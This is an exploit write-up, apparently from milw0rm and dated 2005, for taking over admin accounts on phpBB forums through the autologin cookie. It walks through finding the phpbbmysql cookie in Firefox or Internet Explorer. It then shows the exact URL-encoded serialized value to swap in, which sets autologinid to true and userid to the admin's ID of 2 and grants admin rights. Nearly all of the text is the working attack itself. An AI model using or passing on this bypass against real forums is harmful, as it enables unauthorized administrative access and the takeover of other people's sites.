@@ -1,0 +1,44 @@
+1. Register at forum?
+
+2. Log in with account
+  + UNCHECK "Log in automatically"
+
+3. Close browser to be sure a cookie is made.
+
+4. Locate cookie
+    *firefox: X:\Documents and Settings\Name\Application
+     Data\Mozilla\Firefox\Profiles\profile.default\cookies.txt
+     --> search the .txt for the domainname (domain.tld)
+     --> default cookiename = phpbbmysql
+    *iexplorer: X:\Documents and Settings\Name\Cookies\Name@domain.tld
+     --> default cookiename = phpbbmysql
+
+Let's Xploit!
+________________
+
+Open the cookie in a text editor and search a line that resembles:
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+       a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3B
+       s%3A6%3A%22userid%22%3Bs%3A1%3A%22X%22%3B%7D
+
+                                         |
+                  [ your 'user id' ] ____|
+
+Replace this with:
+
+       a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3B
+       s%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D
+
+                                         |
+          [ 2 = 'user id' of admin ] ____|
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+Save cookie and close.
+Open your browser and surf to forum.
+
+You'll now be automatically logged in having admin right :)
+
+# milw0rm.com [2005-03-05]
